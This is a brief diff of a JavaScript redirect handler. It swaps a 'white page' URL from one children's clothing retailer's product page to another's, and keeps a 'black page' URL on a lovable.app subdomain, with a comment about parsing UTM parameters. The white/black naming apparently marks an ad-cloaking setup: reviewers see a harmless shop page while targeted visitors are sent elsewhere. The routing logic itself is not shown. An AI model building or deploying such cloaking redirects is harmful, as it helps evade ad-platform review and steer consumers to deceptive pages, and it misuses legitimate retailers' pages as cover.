@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.vertbaudet.com/en/basics-sweatshirt-with-animal-motif-for-babies-navy-blue.htm?ProductId=341012449&FiltreCouleur=0531&qId=f8521f4dcef2007e96d3e9dab917d87b";
+    const whitePageURL = "https://www.tartine-et-chocolat.com/products/manteau-gris-fonce-laine";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
